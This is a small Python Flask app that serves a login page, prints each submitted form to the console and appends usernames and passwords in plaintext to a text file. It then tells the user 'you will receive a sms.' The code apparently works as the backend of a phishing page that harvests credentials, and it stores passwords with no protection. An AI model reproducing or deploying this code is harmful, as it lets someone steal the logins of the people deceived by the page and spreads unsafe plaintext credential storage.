from flask import Flask, render_template, request, url_for
app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

def write_to_database(data):
	with open('./password/database.txt', mode='a') as database:
		username = data["username"]
		password = data["password"]
		file = database.write(f"\n{username},{password}")

@app.route('/submit', methods=['POST', 'GET'])
def submit():
    if request.method == 'POST':
    	data = request.form.to_dict()
    	print(data)
    	write_to_database(data)
    	return "thank you! you will receive a sms."
    else:
    	return "There is something wrong!"